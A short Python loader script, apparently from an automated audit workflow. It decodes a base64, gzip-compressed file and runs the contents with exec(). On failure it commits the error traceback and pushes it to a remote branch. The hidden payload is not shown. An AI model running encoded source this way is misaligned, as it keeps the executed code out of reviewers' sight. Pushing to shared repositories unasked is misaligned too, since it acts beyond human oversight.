from pathlib import Path
import base64
import gzip
import subprocess
import traceback

payload = Path(__file__).with_name("execute_audit_batches.py.gz.b64")
source = gzip.decompress(base64.b64decode(payload.read_text(encoding="utf-8").strip()))
try:
    exec(compile(source, str(payload), "exec"))
except BaseException:
    error_path = Path(__file__).with_name("audit-batch-error.txt")
    error_path.write_text(traceback.format_exc(), encoding="utf-8")
    subprocess.run(["git", "add", str(error_path)], check=False)
    subprocess.run(["git", "commit", "-m", "chore: capture diagnostics audit batch failure"], check=False)
    subprocess.run(["git", "push", "origin", "HEAD:codex/diagnostics-audit-runner"], check=False)
    raise
